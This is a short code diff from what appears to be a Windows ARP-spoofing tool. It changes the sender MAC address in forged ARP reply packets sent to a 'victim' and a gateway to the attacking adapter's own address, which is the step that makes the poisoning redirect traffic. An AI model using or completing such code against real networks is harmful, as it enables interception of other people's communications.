@@ -16,7 +16,7 @@ DWORD WINAPI start_spoof(LPVOID lparam)
 		victim_packet,
 		infect_params.gateway_ip,
 		infect_params.victim_ip,
-		infect_params.gateway_mac,
+		infect_params.adapter->Address,
 		infect_params.victim_mac,
 		2 
 	);
@@ -25,7 +25,7 @@ DWORD WINAPI start_spoof(LPVOID lparam)
 		gateway_packet,
 		infect_params.victim_ip,
 		infect_params.gateway_ip,
-		infect_params.victim_mac,
+		infect_params.adapter->Address,
 		infect_params.gateway_mac,
 		2
 	);
